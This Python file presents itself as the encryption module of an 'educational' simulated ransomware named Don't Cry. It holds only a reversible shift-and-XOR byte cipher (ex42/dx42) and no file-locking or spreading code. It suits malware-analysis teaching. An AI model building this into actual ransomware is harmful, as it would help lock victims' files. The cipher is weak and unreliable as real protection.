################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (dcry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics the behavior of real ransomware but must NOT be used for illegal or
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
# under the supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

MIN_ASCII = 32
MAX_ASCII = 126


def calculate_shift(index):
    shift_val = index * 7 + (index // 3) + (index % 11) + ((index >> 2) & 0x7)
    temp_shift = shift_val + (index % 5)
    return (temp_shift % 95) + 1


def calculate_xor_key(index):
    key_val = index * 13 + (index % 17) + ((index << 3) & 0xFF) - (index // 7)
    return key_val % 256


def ex42(text):
    output = bytearray(len(text))
    for i, byte in enumerate(text):
        xor_key = calculate_xor_key(i)
        if MIN_ASCII <= byte <= MAX_ASCII:
            shift = calculate_shift(i)
            rel = byte - MIN_ASCII
            shifted = (rel + shift) % 95
            transformed = shifted + MIN_ASCII
            final_byte = transformed ^ xor_key
        else:
            final_byte = byte ^ xor_key
        output[i] = final_byte
    return bytes(output)


def dx42(data):
    output = bytearray(len(data))
    for i, byte in enumerate(data):
        xor_key = calculate_xor_key(i)
        pre_xor = byte ^ xor_key
        if MIN_ASCII <= pre_xor <= MAX_ASCII:
            shift = calculate_shift(i)
            rel = pre_xor - MIN_ASCII
            unshifted = (rel - shift + 95) % 95
            final_byte = unshifted + MIN_ASCII
        else:
            final_byte = pre_xor

        output[i] = final_byte
    return bytes(output)
